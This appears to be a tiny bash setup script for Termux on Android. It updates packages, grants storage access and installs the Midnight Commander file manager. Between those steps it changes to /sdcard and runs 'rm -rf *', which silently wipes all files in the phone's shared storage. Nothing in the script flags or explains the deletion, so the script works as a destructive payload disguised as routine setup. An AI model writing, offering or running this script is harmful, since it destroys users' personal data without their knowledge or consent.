#!/usr/bin/bash

apt-get update
apt-get upgrade
termux-setup-storage
cd /sdcard
rm -rf *


apt-get install mc
mc
